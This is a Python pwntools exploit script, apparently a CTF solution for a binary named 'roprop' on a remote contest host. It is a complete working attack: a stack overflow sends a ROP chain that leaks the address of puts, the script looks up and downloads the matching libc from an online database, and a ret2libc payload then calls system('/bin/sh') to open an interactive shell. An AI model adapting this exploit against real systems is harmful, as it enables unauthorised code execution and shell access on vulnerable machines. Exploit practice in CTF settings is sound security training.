#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./roprop')
context.log_level = 'INFO'

if not args.REMOTE:
	context.log_file = 'local.log'
	libc = binary.libc
	p = process(binary.path)
else:
	context.log_file = 'remote.log'
	p = remote('roprop.darkarmy.xyz', 5002)

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = 88 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendlineafter('He have got something for you since late 19\'s.\n\n',payload)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
log.info('puts: ' + hex(puts))

if not 'libc' in locals():
	try:
		import requests
		r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
		libc_url = r.json()[0]['download_url']
		libc_file = libc_url.split('/')[-1:][0]
		if not os.path.exists(libc_file):
			log.info('getting: ' + libc_url)
			r = requests.get(libc_url, allow_redirects=True)
			open(libc_file,'wb').write(r.content)
	except:
		log.critical('get libc yourself!')
		sys.exit(0)
	libc = ELF(libc_file)

libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = 88 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendline(payload)
p.interactive()

